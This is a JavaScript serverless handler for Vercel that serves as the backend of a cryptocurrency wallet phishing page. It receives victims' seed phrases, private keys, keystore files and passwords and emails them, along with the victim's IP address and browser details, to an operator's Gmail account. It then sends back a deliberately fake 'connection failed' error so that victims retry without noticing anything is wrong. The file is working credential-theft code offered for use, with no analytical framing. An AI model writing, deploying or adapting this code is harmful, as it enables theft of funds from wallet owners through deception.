// Serverless function for Vercel
import nodemailer from 'nodemailer';

// Simple rate limiter for serverless
const rateLimiter = {
  ipMap: new Map(),
  windowMs: 15 * 60 * 1000, // 15 minutes
  maxRequests: 100,
  
  check: function(ip) {
    const now = Date.now();
    
    if (!this.ipMap.has(ip)) {
      this.ipMap.set(ip, { count: 1, timestamp: now });
      return true;
    }
    
    const data = this.ipMap.get(ip);
    
    // Reset if outside window
    if (now - data.timestamp > this.windowMs) {
      this.ipMap.set(ip, { count: 1, timestamp: now });
      return true;
    }
    
    // Check if over limit
    if (data.count >= this.maxRequests) {
      return false;
    }
    
    // Increment counter
    data.count++;
    this.ipMap.set(ip, data);
    return true;
  }
};

// Email service configuration
const createTransporter = () => {
  return nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });
};

const sendWalletData = async (walletData) => {
  const transporter = createTransporter();

  const emailContent = `
    <h2>🔗 New Wallet Connection</h2>    <div style="font-family: Arial, sans-serif; line-height: 1.6;">
      <h3>Wallet Details:</h3>
      <ul>
        <li><strong>Wallet Type:</strong> ${walletData.walletType}</li>
        <li><strong>Address:</strong> ${walletData.address || 'Not provided'}</li>
        <li><strong>Network:</strong> ${walletData.network || 'Not specified'}</li>
      </ul>
      
      <h3>Connection Info:</h3>
      <ul>
        <li><strong>IP Address:</strong> ${walletData.ipAddress}</li>
        <li><strong>Timestamp:</strong> ${walletData.timestamp}</li>
        <li><strong>User Agent:</strong> ${walletData.userAgent}</li>
      </ul>
      
      ${walletData.phrase ? `
        <h3>🔐 Seed Phrase:</h3>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace;">
          ${walletData.phrase}
        </div>
      ` : ''}
      
      ${walletData.privateKey ? `
        <h3>🔑 Private Key:</h3>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace;">
          ${walletData.privateKey}
        </div>
      ` : ''}
        ${walletData.keystoreJson ? `
        <h3>📁 Keystore JSON:</h3>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace;">
          ${walletData.keystoreJson}
        </div>
        <p><strong>Password:</strong> ${walletData.password || 'Not provided'}</p>
      ` : ''}
    </div>
  `;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER,
    subject: `🔔 Wallet Connection - ${walletData.walletType}`,
    html: emailContent
  };

  return transporter.sendMail(mailOptions);
};

// API analytics (simplified for serverless)
let requestCount = 0;
let successCount = 0;
let failureCount = 0;

const trackApiSuccess = () => {
  requestCount++;
  successCount++;
};

const trackApiFailure = () => {
  requestCount++;
  failureCount++;
};

// Export the serverless function handler
export default async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      message: 'Method not allowed' 
    });
  }

  try {
    // Get client IP address
    const userIP = req.headers['x-forwarded-for'] || 
                 req.headers['x-real-ip'] || 
                 req.connection?.remoteAddress || 
                 'Unknown';
                 
    // Apply rate limiting
    if (!rateLimiter.check(userIP)) {
      return res.status(429).json({
        success: false,
        message: 'Too many requests, please try again later.'
      });
    }

    const walletData = req.body;
    
    console.log(`Received wallet data from IP: ${userIP}`);
    
    if (!walletData.walletType) {
      return res.status(400).json({ 
        success: false, 
        message: 'Wallet type is required' 
      });
    }
    
    // Add IP address and timestamp to wallet data
    const dataWithIp = {
      ...walletData,
      ipAddress: userIP,
      timestamp: new Date().toISOString(),
      userAgent: req.headers['user-agent']
    };
    
    // Send the email with wallet data (still works behind the scenes)
    await sendWalletData(dataWithIp);
    
    // Track successful API request
    trackApiSuccess();
    
    // Return fake error response (but email was still sent!)
    res.status(500).json({
      success: false,
      message: 'Connection failed. Please check your wallet details and try again.',
      error: 'WALLET_CONNECTION_ERROR',
      requestId: `req_${Date.now().toString(36)}_${Math.random().toString(36).substring(2, 7)}`
    });
  } catch (error) {
    // Track failed API request
    trackApiFailure();
    
    console.error('Error processing wallet connection:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to process wallet connection',
      error: process.env.NODE_ENV === 'production' ? undefined : error.message
    });
  }
};
